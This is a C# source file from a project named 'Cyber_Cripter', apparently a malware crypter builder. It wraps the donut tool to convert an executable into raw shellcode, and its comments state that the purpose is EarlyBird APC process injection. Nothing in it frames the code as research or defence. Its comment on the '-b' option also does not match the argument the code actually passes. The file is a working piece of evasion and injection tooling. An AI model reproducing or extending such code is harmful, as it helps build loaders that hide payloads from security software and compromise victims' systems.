using System;
using System.Diagnostics;
using System.IO;

namespace Cyber_Cripter
{
    /// <summary>
    /// Wraps a `donut.exe` invocation that converts a PE into position-independent
    /// shellcode. Donut is required because EarlyBird APC injection executes a
    /// raw memory address as a function — that only works for PIC shellcode, not
    /// a raw PE with imports / relocations / a PE entry point.
    ///
    /// Get donut.exe from https://github.com/TheWover/donut/releases and place
    /// it next to the builder (or anywhere on PATH).
    /// </summary>
    internal static class Donut
    {
        public static byte[] Convert(string inputExePath)
        {
            string donutExe = LocateDonut();
            if (donutExe == null)
                throw new FileNotFoundException(
                    "donut.exe not found. Place it next to the builder or on PATH. " +
                    "Download: https://github.com/TheWover/donut/releases");

            string tmpDir = Path.Combine(Path.GetTempPath(),
                "cybercripter_" + Guid.NewGuid().ToString("N"));
            Directory.CreateDirectory(tmpDir);
            string outBin = Path.Combine(tmpDir, "payload.bin");

            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = donutExe,
                    // -a 2 = x64, -b 3 = bypass AMSI/WLDP off (we don't need it),
                    // -f 1 = output as raw .bin, -o = output path, -i = input PE
                    Arguments = string.Format(
                        "-a 2 -b 1 -f 1 -o \"{0}\" -i \"{1}\"", outBin, inputExePath),
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true,
                    WorkingDirectory = tmpDir
                };

                using (var p = Process.Start(psi))
                {
                    string stdout = p.StandardOutput.ReadToEnd();
                    string stderr = p.StandardError.ReadToEnd();
                    p.WaitForExit();
                    if (p.ExitCode != 0 || !File.Exists(outBin))
                        throw new InvalidOperationException(
                            "donut.exe failed (exit " + p.ExitCode + ").\n" +
                            "stdout:\n" + stdout + "\nstderr:\n" + stderr);
                }

                return File.ReadAllBytes(outBin);
            }
            finally
            {
                try { Directory.Delete(tmpDir, true); } catch { /* best effort */ }
            }
        }

        private static string LocateDonut()
        {
            string appDir = AppDomain.CurrentDomain.BaseDirectory;
            string candidate = Path.Combine(appDir, "donut.exe");
            if (File.Exists(candidate)) return candidate;

            string path = Environment.GetEnvironmentVariable("PATH") ?? "";
            foreach (string dir in path.Split(Path.PathSeparator))
            {
                if (string.IsNullOrEmpty(dir)) continue;
                try
                {
                    string c = Path.Combine(dir, "donut.exe");
                    if (File.Exists(c)) return c;
                }
                catch { /* invalid PATH entry */ }
            }
            return null;
        }
    }
}
